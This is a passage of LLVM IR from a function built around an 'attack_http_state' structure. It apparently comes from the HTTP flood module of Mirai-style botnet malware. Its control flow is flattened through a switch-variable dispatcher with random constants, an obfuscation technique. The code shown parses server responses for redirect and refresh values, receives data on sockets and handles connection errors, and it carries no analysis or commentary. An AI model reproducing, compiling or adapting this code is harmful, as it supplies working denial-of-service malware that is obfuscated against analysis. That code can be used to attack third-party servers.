  store i32 89144342, i32* %switchVar
  br label %loopEnd

; <label>:1901:                                   ; preds = %loopEntry
  store i32 1851745042, i32* %switchVar
  br label %loopEnd

; <label>:1902:                                   ; preds = %loopEntry
  %1903 = load i8*, i8** %57, align 8
  %1904 = call i32 @util_atoi(i8* %1903, i32 10)
  store i32 %1904, i32* %58, align 4
  store i32 1936856554, i32* %switchVar
  br label %loopEnd

; <label>:1905:                                   ; preds = %loopEntry
  %1906 = load i32, i32* %58, align 4
  %1907 = icmp sgt i32 %1906, 0
  %1908 = select i1 %1907, i32 1714164431, i32 -1003512673
  store i32 %1908, i32* %switchVar
  store i1 false, i1* %.reg2mem21
  br label %loopEnd

; <label>:1909:                                   ; preds = %loopEntry
  %1910 = load i32, i32* %58, align 4
  %1911 = icmp slt i32 %1910, 10
  %1912 = select i1 %1911, i32 1271509497, i32 -1003512673
  store i32 %1912, i32* %switchVar
  store i1 false, i1* %.reg2mem21
  br label %loopEnd

; <label>:1913:                                   ; preds = %loopEntry
  %1914 = load i32, i32* %27, align 4
  %1915 = load i32, i32* %58, align 4
  %1916 = add i32 %1914, %1915
  %1917 = zext i32 %1916 to i64
  %1918 = call i64 @time(i64* null) #6
  %1919 = icmp sgt i64 %1917, %1918
  store i32 -1003512673, i32* %switchVar
  store i1 %1919, i1* %.reg2mem21
  br label %loopEnd

; <label>:1920:                                   ; preds = %loopEntry
  %.reload22 = load i1, i1* %.reg2mem21
  %1921 = select i1 %.reload22, i32 1623243175, i32 1286429128
  store i32 %1921, i32* %switchVar
  br label %loopEnd

; <label>:1922:                                   ; preds = %loopEntry
  %1923 = call i32 @sleep(i32 1)
  store i32 1936856554, i32* %switchVar
  br label %loopEnd

; <label>:1924:                                   ; preds = %loopEntry
  %1925 = load i8*, i8** %57, align 8
  %1926 = load i32, i32* %10, align 4
  %1927 = sext i32 %1926 to i64
  %1928 = getelementptr inbounds i8, i8* %1925, i64 %1927
  store i8* %1928, i8** %57, align 8
  %1929 = load i8*, i8** %57, align 8
  %1930 = load i8*, i8** %57, align 8
  %1931 = call i32 @util_strlen(i8* %1930)
  %1932 = call i32 @util_stristr(i8* %1929, i32 %1931, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %1933 = icmp eq i32 %1932, 4
  %1934 = select i1 %1933, i32 -1552194864, i32 -886024123
  store i32 %1934, i32* %switchVar
  br label %loopEnd

; <label>:1935:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %1936 = load i8*, i8** %57, align 8
  %1937 = getelementptr inbounds i8, i8* %1936, i64 4
  %1938 = load i8, i8* %1937, align 1
  %1939 = sext i8 %1938 to i32
  %1940 = icmp eq i32 %1939, 115
  %1941 = select i1 %1940, i32 -1087113776, i32 -1494058248
  store i32 %1941, i32* %switchVar
  br label %loopEnd

; <label>:1942:                                   ; preds = %loopEntry
  %1943 = load i32, i32* %10, align 4
  %1944 = add nsw i32 %1943, 1
  store i32 %1944, i32* %10, align 4
  store i32 -1494058248, i32* %switchVar
  br label %loopEnd

; <label>:1945:                                   ; preds = %loopEntry
  %1946 = load i8*, i8** %57, align 8
  %1947 = load i8*, i8** %57, align 8
  %1948 = load i32, i32* %10, align 4
  %1949 = sext i32 %1948 to i64
  %1950 = getelementptr inbounds i8, i8* %1947, i64 %1949
  %1951 = load i32, i32* %56, align 4
  %1952 = load i32, i32* %10, align 4
  %1953 = sub nsw i32 %1951, %1952
  %1954 = sext i32 %1953 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1946, i8* %1950, i64 %1954, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 -9091542, i32* %switchVar
  br label %loopEnd

; <label>:1955:                                   ; preds = %loopEntry
  %1956 = load i8*, i8** %57, align 8
  %1957 = load i32, i32* %10, align 4
  %1958 = sext i32 %1957 to i64
  %1959 = getelementptr inbounds i8, i8* %1956, i64 %1958
  %1960 = load i8, i8* %1959, align 1
  %1961 = sext i8 %1960 to i32
  %1962 = icmp ne i32 %1961, 0
  %1963 = select i1 %1962, i32 -2005989595, i32 -1527630237
  store i32 %1963, i32* %switchVar
  br label %loopEnd

; <label>:1964:                                   ; preds = %loopEntry
  %1965 = load i8*, i8** %57, align 8
  %1966 = load i32, i32* %10, align 4
  %1967 = sext i32 %1966 to i64
  %1968 = getelementptr inbounds i8, i8* %1965, i64 %1967
  %1969 = load i8, i8* %1968, align 1
  %1970 = sext i8 %1969 to i32
  %1971 = icmp eq i32 %1970, 47
  %1972 = select i1 %1971, i32 1738327871, i32 -1939176896
  store i32 %1972, i32* %switchVar
  br label %loopEnd

; <label>:1973:                                   ; preds = %loopEntry
  %1974 = load i8*, i8** %57, align 8
  %1975 = load i32, i32* %10, align 4
  %1976 = sext i32 %1975 to i64
  %1977 = getelementptr inbounds i8, i8* %1974, i64 %1976
  store i8 0, i8* %1977, align 1
  store i32 -1527630237, i32* %switchVar
  br label %loopEnd

; <label>:1978:                                   ; preds = %loopEntry
  %1979 = load i32, i32* %10, align 4
  %1980 = add nsw i32 %1979, 1
  store i32 %1980, i32* %10, align 4
  store i32 -9091542, i32* %switchVar
  br label %loopEnd

; <label>:1981:                                   ; preds = %loopEntry
  %1982 = load i8*, i8** %57, align 8
  %1983 = call i32 @util_strlen(i8* %1982)
  %1984 = icmp sgt i32 %1983, 0
  %1985 = select i1 %1984, i32 -2127132432, i32 -546144740
  store i32 %1985, i32* %switchVar
  br label %loopEnd

; <label>:1986:                                   ; preds = %loopEntry
  %1987 = load i8*, i8** %57, align 8
  %1988 = call i32 @util_strlen(i8* %1987)
  %1989 = icmp slt i32 %1988, 128
  %1990 = select i1 %1989, i32 -400070254, i32 -546144740
  store i32 %1990, i32* %switchVar
  br label %loopEnd

; <label>:1991:                                   ; preds = %loopEntry
  %1992 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1993 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1992, i32 0, i32 7
  %1994 = getelementptr inbounds [129 x i8], [129 x i8]* %1993, i32 0, i32 0
  %1995 = load i8*, i8** %57, align 8
  %1996 = call i32 @util_strcpy(i8* %1994, i8* %1995)
  store i32 -546144740, i32* %switchVar
  br label %loopEnd

; <label>:1997:                                   ; preds = %loopEntry
  %1998 = load i8*, i8** %57, align 8
  %1999 = load i32, i32* %10, align 4
  %2000 = add nsw i32 %1999, 1
  %2001 = sext i32 %2000 to i64
  %2002 = getelementptr inbounds i8, i8* %1998, i64 %2001
  %2003 = call i32 @util_strlen(i8* %2002)
  %2004 = icmp slt i32 %2003, 256
  %2005 = select i1 %2004, i32 888214841, i32 1438363531
  store i32 %2005, i32* %switchVar
  br label %loopEnd

; <label>:2006:                                   ; preds = %loopEntry
  %2007 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2008 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2007, i32 0, i32 6
  %2009 = getelementptr inbounds [257 x i8], [257 x i8]* %2008, i32 0, i32 0
  %2010 = getelementptr inbounds i8, i8* %2009, i64 1
  call void @util_zero(i8* %2010, i32 255)
  %2011 = load i8*, i8** %57, align 8
  %2012 = load i32, i32* %10, align 4
  %2013 = add nsw i32 %2012, 1
  %2014 = sext i32 %2013 to i64
  %2015 = getelementptr inbounds i8, i8* %2011, i64 %2014
  %2016 = call i32 @util_strlen(i8* %2015)
  %2017 = icmp sgt i32 %2016, 0
  %2018 = select i1 %2017, i32 1014645307, i32 658473256
  store i32 %2018, i32* %switchVar
  br label %loopEnd

; <label>:2019:                                   ; preds = %loopEntry
  %2020 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2021 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2020, i32 0, i32 6
  %2022 = getelementptr inbounds [257 x i8], [257 x i8]* %2021, i32 0, i32 0
  %2023 = getelementptr inbounds i8, i8* %2022, i64 1
  %2024 = load i8*, i8** %57, align 8
  %2025 = load i32, i32* %10, align 4
  %2026 = add nsw i32 %2025, 1
  %2027 = sext i32 %2026 to i64
  %2028 = getelementptr inbounds i8, i8* %2024, i64 %2027
  %2029 = call i32 @util_strcpy(i8* %2023, i8* %2028)
  store i32 658473256, i32* %switchVar
  br label %loopEnd

; <label>:2030:                                   ; preds = %loopEntry
  store i32 1438363531, i32* %switchVar
  br label %loopEnd

; <label>:2031:                                   ; preds = %loopEntry
  store i32 1187232923, i32* %switchVar
  br label %loopEnd

; <label>:2032:                                   ; preds = %loopEntry
  %2033 = load i8*, i8** %57, align 8
  %2034 = getelementptr inbounds i8, i8* %2033, i64 0
  %2035 = load i8, i8* %2034, align 1
  %2036 = sext i8 %2035 to i32
  %2037 = icmp eq i32 %2036, 47
  %2038 = select i1 %2037, i32 -33403100, i32 660158033
  store i32 %2038, i32* %switchVar
  br label %loopEnd

; <label>:2039:                                   ; preds = %loopEntry
  %2040 = load i8*, i8** %57, align 8
  %2041 = load i32, i32* %10, align 4
  %2042 = add nsw i32 %2041, 1
  %2043 = sext i32 %2042 to i64
  %2044 = getelementptr inbounds i8, i8* %2040, i64 %2043
  %2045 = call i32 @util_strlen(i8* %2044)
  %2046 = icmp slt i32 %2045, 256
  %2047 = select i1 %2046, i32 -3557371, i32 -893275886
  store i32 %2047, i32* %switchVar
  br label %loopEnd

; <label>:2048:                                   ; preds = %loopEntry
  %2049 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2050 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2049, i32 0, i32 6
  %2051 = getelementptr inbounds [257 x i8], [257 x i8]* %2050, i32 0, i32 0
  %2052 = getelementptr inbounds i8, i8* %2051, i64 1
  call void @util_zero(i8* %2052, i32 255)
  %2053 = load i8*, i8** %57, align 8
  %2054 = load i32, i32* %10, align 4
  %2055 = add nsw i32 %2054, 1
  %2056 = sext i32 %2055 to i64
  %2057 = getelementptr inbounds i8, i8* %2053, i64 %2056
  %2058 = call i32 @util_strlen(i8* %2057)
  %2059 = icmp sgt i32 %2058, 0
  %2060 = select i1 %2059, i32 -249106234, i32 2068864309
  store i32 %2060, i32* %switchVar
  br label %loopEnd

; <label>:2061:                                   ; preds = %loopEntry
  %2062 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2063 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2062, i32 0, i32 6
  %2064 = getelementptr inbounds [257 x i8], [257 x i8]* %2063, i32 0, i32 0
  %2065 = getelementptr inbounds i8, i8* %2064, i64 1
  %2066 = load i8*, i8** %57, align 8
  %2067 = load i32, i32* %10, align 4
  %2068 = add nsw i32 %2067, 1
  %2069 = sext i32 %2068 to i64
  %2070 = getelementptr inbounds i8, i8* %2066, i64 %2069
  %2071 = call i32 @util_strcpy(i8* %2065, i8* %2070)
  store i32 2068864309, i32* %switchVar
  br label %loopEnd

; <label>:2072:                                   ; preds = %loopEntry
  store i32 -893275886, i32* %switchVar
  br label %loopEnd

; <label>:2073:                                   ; preds = %loopEntry
  store i32 660158033, i32* %switchVar
  br label %loopEnd

; <label>:2074:                                   ; preds = %loopEntry
  store i32 1187232923, i32* %switchVar
  br label %loopEnd

; <label>:2075:                                   ; preds = %loopEntry
  %2076 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2076, i32 0, i32 9
  %2078 = getelementptr inbounds [9 x i8], [9 x i8]* %2077, i32 0, i32 0
  %2079 = call i8* @strcpy(i8* %2078, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %2080 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2081 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2080, i32 0, i32 1
  store i8 10, i8* %2081, align 4
  store i32 -1530442444, i32* %switchVar
  br label %loopEnd

; <label>:2082:                                   ; preds = %loopEntry
  store i32 1871134625, i32* %switchVar
  br label %loopEnd

; <label>:2083:                                   ; preds = %loopEntry
  store i32 559412456, i32* %switchVar
  br label %loopEnd

; <label>:2084:                                   ; preds = %loopEntry
  %2085 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2086 = load i32, i32* %12, align 4
  %2087 = call i32 @util_memsearch(i8* %2085, i32 %2086, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %2087, i32* %37, align 4
  %2088 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2089 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2088, i32 0, i32 9
  %2090 = getelementptr inbounds [9 x i8], [9 x i8]* %2089, i32 0, i32 0
  %2091 = call signext i8 @util_strcmp(i8* %2090, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %2092 = sext i8 %2091 to i32
  %2093 = icmp ne i32 %2092, 0
  %2094 = select i1 %2093, i32 -1254405374, i32 -884290316
  store i32 %2094, i32* %switchVar
  br label %loopEnd

; <label>:2095:                                   ; preds = %loopEntry
  %2096 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2097 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2096, i32 0, i32 9
  %2098 = getelementptr inbounds [9 x i8], [9 x i8]* %2097, i32 0, i32 0
  %2099 = call signext i8 @util_strcmp(i8* %2098, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %2100 = sext i8 %2099 to i32
  %2101 = icmp ne i32 %2100, 0
  %2102 = select i1 %2101, i32 -1254405374, i32 693339751
  store i32 %2102, i32* %switchVar
  br label %loopEnd

; <label>:2103:                                   ; preds = %loopEntry
  %2104 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2105 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2104, i32 0, i32 1
  store i8 7, i8* %2105, align 4
  store i32 -1124523126, i32* %switchVar
  br label %loopEnd

; <label>:2106:                                   ; preds = %loopEntry
  %2107 = load i32, i32* %12, align 4
  %2108 = load i32, i32* %37, align 4
  %2109 = icmp sgt i32 %2107, %2108
  %2110 = select i1 %2109, i32 1473934761, i32 -922684584
  store i32 %2110, i32* %switchVar
  br label %loopEnd

; <label>:2111:                                   ; preds = %loopEntry
  %2112 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2113 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2112, i32 0, i32 1
  store i8 10, i8* %2113, align 4
  store i32 -1871992277, i32* %switchVar
  br label %loopEnd

; <label>:2114:                                   ; preds = %loopEntry
  %2115 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2115, i32 0, i32 1
  store i8 1, i8* %2116, align 4
  store i32 -1871992277, i32* %switchVar
  br label %loopEnd

; <label>:2117:                                   ; preds = %loopEntry
  store i32 -1124523126, i32* %switchVar
  br label %loopEnd

; <label>:2118:                                   ; preds = %loopEntry
  %2119 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2120 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2119, i32 0, i32 0
  %2121 = load i32, i32* %2120, align 4
  %2122 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2123 = load i32, i32* %37, align 4
  %2124 = sext i32 %2123 to i64
  %2125 = call i64 @recv(i32 %2121, i8* %2122, i64 %2124, i32 16384)
  %2126 = trunc i64 %2125 to i32
  store i32 %2126, i32* %12, align 4
  store i32 977541859, i32* %switchVar
  br label %loopEnd

; <label>:2127:                                   ; preds = %loopEntry
  %2128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2128, i32 0, i32 1
  %2130 = load i8, i8* %2129, align 4
  %2131 = zext i8 %2130 to i32
  %2132 = icmp eq i32 %2131, 7
  %2133 = select i1 %2132, i32 1542599766, i32 480683986
  store i32 %2133, i32* %switchVar
  br label %loopEnd

; <label>:2134:                                   ; preds = %loopEntry
  store i32 -132963115, i32* %switchVar
  br label %loopEnd

; <label>:2135:                                   ; preds = %loopEntry
  %2136 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2137 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2136, i32 0, i32 1
  %2138 = load i8, i8* %2137, align 4
  %2139 = zext i8 %2138 to i32
  %2140 = icmp ne i32 %2139, 7
  %2141 = select i1 %2140, i32 -1021265117, i32 -436323434
  store i32 %2141, i32* %switchVar
  br label %loopEnd

; <label>:2142:                                   ; preds = %loopEntry
  store i32 -549469125, i32* %switchVar
  br label %loopEnd

; <label>:2143:                                   ; preds = %loopEntry
  %2144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2144, i32 0, i32 17
  %2146 = load i32, i32* %2145, align 4
  %2147 = icmp eq i32 %2146, 1024
  %2148 = select i1 %2147, i32 659835140, i32 -1983494389
  store i32 %2148, i32* %switchVar
  br label %loopEnd

; <label>:2149:                                   ; preds = %loopEntry
  %2150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2150, i32 0, i32 18
  %2152 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2151, i32 0, i32 0
  %2153 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2154 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2153, i32 0, i32 18
  %2155 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2154, i32 0, i32 0
  %2156 = getelementptr inbounds i8, i8* %2155, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2152, i8* %2156, i64 960, i32 1, i1 false)
  %2157 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2157, i32 0, i32 17
  %2159 = load i32, i32* %2158, align 4
  %2160 = sub nsw i32 %2159, 64
  store i32 %2160, i32* %2158, align 4
  store i32 -1983494389, i32* %switchVar
  br label %loopEnd

; <label>:2161:                                   ; preds = %loopEntry
  %2162 = call i32* @__errno_location() #7
  store i32 0, i32* %2162, align 4
  %2163 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2163, i32 0, i32 0
  %2165 = load i32, i32* %2164, align 4
  %2166 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2166, i32 0, i32 18
  %2168 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2167, i32 0, i32 0
  %2169 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2170 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2169, i32 0, i32 17
  %2171 = load i32, i32* %2170, align 4
  %2172 = sext i32 %2171 to i64
  %2173 = getelementptr inbounds i8, i8* %2168, i64 %2172
  %2174 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2174, i32 0, i32 17
  %2176 = load i32, i32* %2175, align 4
  %2177 = sub nsw i32 1024, %2176
  %2178 = sext i32 %2177 to i64
  %2179 = call i64 @recv(i32 %2165, i8* %2173, i64 %2178, i32 16384)
  %2180 = trunc i64 %2179 to i32
  store i32 %2180, i32* %12, align 4
  %2181 = load i32, i32* %12, align 4
  %2182 = icmp eq i32 %2181, 0
  %2183 = select i1 %2182, i32 -739514643, i32 -1327747350
  store i32 %2183, i32* %switchVar
  br label %loopEnd

; <label>:2184:                                   ; preds = %loopEntry
  %2185 = call i32* @__errno_location() #7
  store i32 104, i32* %2185, align 4
  store i32 -1, i32* %12, align 4
  store i32 -1327747350, i32* %switchVar
  br label %loopEnd

; <label>:2186:                                   ; preds = %loopEntry
  %2187 = load i32, i32* %12, align 4
  %2188 = icmp eq i32 %2187, -1
  %2189 = select i1 %2188, i32 -304810401, i32 -1006268956
  store i32 %2189, i32* %switchVar
  br label %loopEnd

; <label>:2190:                                   ; preds = %loopEntry
  %2191 = call i32* @__errno_location() #7
  %2192 = load i32, i32* %2191, align 4
  %2193 = icmp ne i32 %2192, 11
  %2194 = select i1 %2193, i32 -142802477, i32 -153741911
  store i32 %2194, i32* %switchVar
  br label %loopEnd

; <label>:2195:                                   ; preds = %loopEntry
  %2196 = call i32* @__errno_location() #7
  %2197 = load i32, i32* %2196, align 4
  %2198 = icmp ne i32 %2197, 11
  %2199 = select i1 %2198, i32 -1495973729, i32 -153741911
  store i32 %2199, i32* %switchVar
  br label %loopEnd

; <label>:2200:                                   ; preds = %loopEntry
  %2201 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2202 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2201, i32 0, i32 0
  %2203 = load i32, i32* %2202, align 4
  %2204 = call i32 @close(i32 %2203)
  %2205 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2205, i32 0, i32 0
  store i32 -1, i32* %2206, align 4
  %2207 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2208 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2207, i32 0, i32 1
  store i8 0, i8* %2208, align 4
  store i32 -153741911, i32* %switchVar
  br label %loopEnd

; <label>:2209:                                   ; preds = %loopEntry
  store i32 -549469125, i32* %switchVar
  br label %loopEnd

; <label>:2210:                                   ; preds = %loopEntry
  %2211 = load i32, i32* %12, align 4
  %2212 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2212, i32 0, i32 17
  %2214 = load i32, i32* %2213, align 4
  %2215 = add nsw i32 %2214, %2211
  store i32 %2215, i32* %2213, align 4
  %2216 = load i32, i32* %27, align 4
  %2217 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2217, i32 0, i32 2
  store i32 %2216, i32* %2218, align 4
  store i32 739963328, i32* %switchVar
  br label %loopEnd

; <label>:2219:                                   ; preds = %loopEntry
  store i32 0, i32* %59, align 4
  %2220 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2220, i32 0, i32 14
  %2222 = load i32, i32* %2221, align 4
  %2223 = icmp sgt i32 %2222, 0
  %2224 = select i1 %2223, i32 -65716374, i32 -546231447
  store i32 %2224, i32* %switchVar
  br label %loopEnd

; <label>:2225:                                   ; preds = %loopEntry
  %2226 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2226, i32 0, i32 14
  %2228 = load i32, i32* %2227, align 4
  %2229 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2230 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2229, i32 0, i32 17
  %2231 = load i32, i32* %2230, align 4
  %2232 = icmp sgt i32 %2228, %2231
  %2233 = select i1 %2232, i32 1472380554, i32 833540524
  store i32 %2233, i32* %switchVar
  br label %loopEnd

; <label>:2234:                                   ; preds = %loopEntry
  %2235 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2235, i32 0, i32 17
  %2237 = load i32, i32* %2236, align 4
  store i32 227385679, i32* %switchVar
  store i32 %2237, i32* %.reg2mem23
  br label %loopEnd

; <label>:2238:                                   ; preds = %loopEntry
  %2239 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2240 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2239, i32 0, i32 14
  %2241 = load i32, i32* %2240, align 4
  store i32 227385679, i32* %switchVar
  store i32 %2241, i32* %.reg2mem23
  br label %loopEnd

; <label>:2242:                                   ; preds = %loopEntry
  %.reload24 = load i32, i32* %.reg2mem23
  store i32 %.reload24, i32* %59, align 4
  %2243 = load i32, i32* %59, align 4
  %2244 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2245 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2244, i32 0, i32 14
  %2246 = load i32, i32* %2245, align 4
  %2247 = sub nsw i32 %2246, %2243
  store i32 %2247, i32* %2245, align 4
  %2248 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2249 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2248, i32 0, i32 11
  %2250 = load i32, i32* %2249, align 4
  %2251 = icmp eq i32 %2250, 1
  %2252 = select i1 %2251, i32 -1383014660, i32 -111800272
  store i32 %2252, i32* %switchVar
  br label %loopEnd

; <label>:2253:                                   ; preds = %loopEntry
  %2254 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2254, i32 0, i32 18
  %2256 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2255, i32 0, i32 0
  %2257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2257, i32 0, i32 17
  %2259 = load i32, i32* %2258, align 4
  %2260 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2261 = call i32 @util_memsearch(i8* %2256, i32 %2259, i8* %2260, i32 11)
  %2262 = icmp ne i32 %2261, -1
  %2263 = select i1 %2262, i32 -1448369368, i32 -1884251892
  store i32 %2263, i32* %switchVar
  br label %loopEnd

; <label>:2264:                                   ; preds = %loopEntry
  %2265 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2265, i32 0, i32 18
  %2267 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2266, i32 0, i32 0
  %2268 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2268, i32 0, i32 17
  %2270 = load i32, i32* %2269, align 4
  %2271 = call i8* @table_retrieve_val(i32 43, i32* null)
  %2272 = call i32 @util_memsearch(i8* %2267, i32 %2270, i8* %2271, i32 11)
  store i32 %2272, i32* %60, align 4
  %2273 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2274 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2273, i32 0, i32 18
  %2275 = load i32, i32* %60, align 4
  %2276 = sext i32 %2275 to i64
  %2277 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2274, i64 0, i64 %2276
  %2278 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2279 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2278, i32 0, i32 17
  %2280 = load i32, i32* %2279, align 4
  %2281 = load i32, i32* %60, align 4
  %2282 = sub nsw i32 %2280, %2281
  %2283 = call i32 @util_memsearch(i8* %2277, i32 %2282, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2283, i32* %61, align 4
  %2284 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2285 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2284, i32 0, i32 18
  %2286 = load i32, i32* %60, align 4
  %2287 = load i32, i32* %61, align 4
  %2288 = sub nsw i32 %2287, 1
  %2289 = add nsw i32 %2286, %2288
  %2290 = sext i32 %2289 to i64
  %2291 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2285, i64 0, i64 %2290
  store i8 0, i8* %2291, align 1
  %2292 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2293 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2292, i32 0, i32 15
  %2294 = load i32, i32* %2293, align 4
  %2295 = icmp slt i32 %2294, 5
  %2296 = select i1 %2295, i32 897886336, i32 1193141542
  store i32 %2296, i32* %switchVar
  br label %loopEnd

; <label>:2297:                                   ; preds = %loopEntry
  %2298 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2298, i32 0, i32 18
  %2300 = load i32, i32* %60, align 4
  %2301 = sext i32 %2300 to i64
  %2302 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2299, i64 0, i64 %2301
  %2303 = call i32 @util_strlen(i8* %2302)
  %2304 = icmp slt i32 %2303, 128
  %2305 = select i1 %2304, i32 1238277918, i32 1193141542
  store i32 %2305, i32* %switchVar
  br label %loopEnd

; <label>:2306:                                   ; preds = %loopEntry
  %2307 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2308 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2307, i32 0, i32 16
  %2309 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2309, i32 0, i32 15
  %2311 = load i32, i32* %2310, align 4
  %2312 = sext i32 %2311 to i64
  %2313 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2308, i64 0, i64 %2312
  %2314 = getelementptr inbounds [128 x i8], [128 x i8]* %2313, i32 0, i32 0
